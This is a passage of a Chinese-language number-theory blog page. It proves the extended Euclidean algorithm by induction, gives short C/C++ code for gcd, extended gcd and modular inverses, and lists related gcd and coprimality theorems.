style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span><br><strong>数学归纳法:</strong><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>假设上式对于</mtext><mo separator="true">,</mo><mo>−</mo><mn>2</mn><mo>≤</mo><mi>j</mi><mo>≤</mo><mi>k</mi><mo>−</mo><mn>1</mn><mtext>成立</mtext><mo separator="true">,</mo><mtext>即</mtext><mspace linebreak="newline"></mspace><msub><mi>s</mi><mi>j</mi></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mi>j</mi></msub><mi>b</mi><mo>&#x3D;</mo><msub><mi>r</mi><mi>j</mi></msub><mspace linebreak="newline"></mspace><mtext>对于</mtext><mi>j</mi><mo>&#x3D;</mo><mi>k</mi><mtext>，有</mtext><mo>:</mo><mspace linebreak="newline"></mspace><msub><mi>r</mi><mi>k</mi></msub><mo>&#x3D;</mo><msub><mi>r</mi><mrow><mi>k</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>−</mo><msub><mi>q</mi><mi>k</mi></msub><msub><mi>r</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mspace linebreak="newline"></mspace><mtext> 利用归纳假设，得到</mtext><mo>:</mo><mspace linebreak="newline"></mspace><msub><mi>r</mi><mi>k</mi></msub><mo>&#x3D;</mo><mo stretchy="false">(</mo><msub><mi>s</mi><mrow><mi>k</mi><mo>−</mo><mn>2</mn></mrow></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mrow><mi>k</mi><mo>−</mo><mn>2</mn></mrow></msub><mi>b</mi><mo stretchy="false">)</mo><mo>−</mo><msub><mi>q</mi><mi>k</mi></msub><mo stretchy="false">(</mo><msub><mi>s</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mi>b</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>r</mi><mi>k</mi></msub><mo>&#x3D;</mo><mo stretchy="false">(</mo><msub><mi>s</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>q</mi><mi>k</mi></msub><msub><mi>s</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo><mi>a</mi><mo>+</mo><mo stretchy="false">(</mo><msub><mi>t</mi><mrow><mi>k</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>−</mo><msub><mi>q</mi><mi>k</mi></msub><msub><mi>t</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo><mi>b</mi><mspace linebreak="newline"></mspace><msub><mi>r</mi><mi>k</mi></msub><mo>&#x3D;</mo><msub><mi>s</mi><mi>k</mi></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mi>k</mi></msub><mi>b</mi><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex"> 假设上式对于,-2\leq j\leq k-1成立,即\newline<br>s_ja+t_jb&#x3D;r_j\newline<br>对于j&#x3D;k，有:\newline<br>r_k&#x3D;r_{k-2}-q_kr_{k-1}\newline<br>利用归纳假设，得到:\newline<br>r_k&#x3D;(s_{k-2}a+t_{k-2}b)-q_k(s_{k-1}a+t_{k-1}b)\newline<br>r_k&#x3D;(s_{k-1}-q_ks_{k-1})a+(t_{k-2}-q_kt_{k-1})b\newline<br>r_k&#x3D;s_ka+t_kb\newline</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord cjk_fallback">假设上式对于</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mord cjk_fallback">成立</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">即</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord cjk_fallback">对于</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">，有</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mspace"> </span><span class="mord cjk_fallback">利用归纳假设，得到</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">b</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span></span><span class="mspace newline"></span></span></span></p>        </div>      </div>    </div><h3 id="算法设计-1"><a href="#算法设计-1" class="headerlink" title="算法设计"></a>算法设计</h3>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-15d0fc7b" role="button" aria-expanded="false" aria-controls="collapse-15d0fc7b">        <div class="fold-arrow">▶</div>递归算法      </div>      <div class="fold-collapse collapse" id="collapse-15d0fc7b">        <div class="fold-content">          <h4 id="区别与联系"><a href="#区别与联系" class="headerlink" title="区别与联系"></a>区别与联系</h4><blockquote><ul><li><strong>欧几里得算法，即辗转相除法，将求两个较大数的公因数转化为求两个较小数的公因数。</strong></li><li><strong>扩展欧几里得算法，引入了关于s和t的递推关系，在计算r的递推关系求出(a,b)的同时，算出s和t</strong></li><li><strong>扩展欧几里得算法求逆元，是扩展欧几里得算法的主要应用</strong><br>由定理1.9可知，当(m,b)&#x3D;1时,sm+tb&#x3D;(m,b)&#x3D;1，因此，tb&#x3D;1(mod m)<br>于是找到了t，这是b在乘法群中的乘法逆元（第六章）</li></ul></blockquote><h4 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">gcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br><span class="hljs-keyword">if</span>(b == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-keyword">return</span> gcd(b,a%b);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">exgcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> &amp;x,<span class="hljs-type">int</span> &amp;y)</span><br>&#123;<br><span class="hljs-keyword">if</span>(b == <span class="hljs-number">0</span>)&#123;<br>x = <span class="hljs-number">1</span>;<br>y = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-type">int</span> d = exgcd(b,a%b,x,y);<br><span class="hljs-type">int</span> z = x;<br>x = y;<br>y = z - a / b * y;<br><span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="扩展欧几里得算法求逆元"><a href="#扩展欧几里得算法求逆元" class="headerlink" title="扩展欧几里得算法求逆元"></a>扩展欧几里得算法求逆元</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">inv</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> x,y;<br><span class="hljs-type">int</span> d = <span class="hljs-built_in">exgcd</span>(a,p,x,y);<br><span class="hljs-keyword">return</span> (x % p + p) % p;<span class="hljs-comment">//保证返回值在[0,p)之间</span><br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div><h2 id="补充定理"><a href="#补充定理" class="headerlink" title="补充定理:"></a>补充定理:</h2><p>这部能够深化对素数和gcd的认识，提出了一些实用的性质。<br>同时又像是贝祖定理的拓展（因为所有证明都离不开贝祖定理）<br>在这对它们进行整理。</p><h3 id="互素的充要条件"><a href="#互素的充要条件" class="headerlink" title="互素的充要条件:"></a>互素的充要条件:</h3><p><img src="/dong.github/images/0916-2.png"></p><h3 id="最大公因数的充要条件"><a href="#最大公因数的充要条件" class="headerlink" title="最大公因数的充要条件"></a>最大公因数的充要条件</h3><p><img src="/dong.github/images/0916-3.png"></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-42f18b29" role="button" aria-expanded="false" aria-controls="collapse-42f18b29">        <div class="fold-arrow">▶</div>证明      </div>      <div class="fold-collapse collapse" id="collapse-42f18b29">        <div class="fold-content">          <p><img src="/dong.github/images/0916-4.png"></p>        </div>      </div>    </div><h3 id="最大公因数的性质"><a href="#最大公因数的性质" class="headerlink" title="最大公因数的性质"></a>最大公因数的性质</h3><p><img src="/dong.github/images/0916-5.png"></p><h3 id="互素的gcd性质"><a href="#互素的gcd性质" class="headerlink" title="互素的gcd性质"></a>互素的gcd性质</h3><p><img src="/dong.github/images/0916-6.png"></p><h4 id="推论1"><a href="#推论1" class="headerlink" title="推论1:"></a>推论1:</h4><p>设a,b,c是三个整数，且c!&#x3D;0，如果c|ab,(a,c)&#x3D;1,则c|b</p><h4 id="推论2"><a href="#推论2" class="headerlink" title="推论2:"></a>推论2:</h4><p>设p是素数, 若p|ab, 则p|a或p|b.</p><h4 id="推论3"><a href="#推论3" class="headerlink" 